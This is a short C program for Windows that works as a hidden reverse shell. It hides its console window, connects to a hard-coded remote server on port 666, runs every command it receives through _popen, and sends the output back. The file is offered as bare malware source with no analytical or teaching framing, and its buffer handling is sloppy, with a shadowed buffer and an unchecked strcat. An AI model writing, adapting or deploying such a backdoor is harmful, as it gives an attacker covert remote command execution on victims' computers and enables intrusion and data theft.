typedef int socklen_t;
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#define _WIN32_WINNT 0x0500
#include <windows.h>


#define PORT 666
#define SERVER "8.8.8.8"

int main(void)
{
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_MINIMIZE);
	ShowWindow(hWnd, SW_HIDE);


	WSADATA WSAData;
	int erreur = WSAStartup(MAKEWORD(2, 2), &WSAData);

	SOCKET sock;
	SOCKADDR_IN sin;
	char buffer[999] = "";

	if (!erreur)
	{
		sock = socket(AF_INET, SOCK_STREAM, 0);

		sin.sin_addr.s_addr = inet_addr(SERVER);
		sin.sin_family = AF_INET;
		sin.sin_port = htons(PORT);

		if (connect(sock, (SOCKADDR*)& sin, sizeof(sin)) != SOCKET_ERROR)
		{
			while (recv(sock, buffer, 999, 0) != SOCKET_ERROR) {
				
				FILE* fp;
				char path[999];
				fp = _popen(buffer, "r");
				char buffer[9999] = "";
				while (fgets(path, sizeof(path) - 1, fp) != NULL) {
					// on concatène chaque ligne de retour
					strcat(buffer, path);
				}

				send(sock, buffer, strlen(buffer)+1, 0);

				// on ferme le process
				_pclose(fp);
				
			}
		}
		closesocket(sock);
		WSACleanup();
	}
	return 0;
}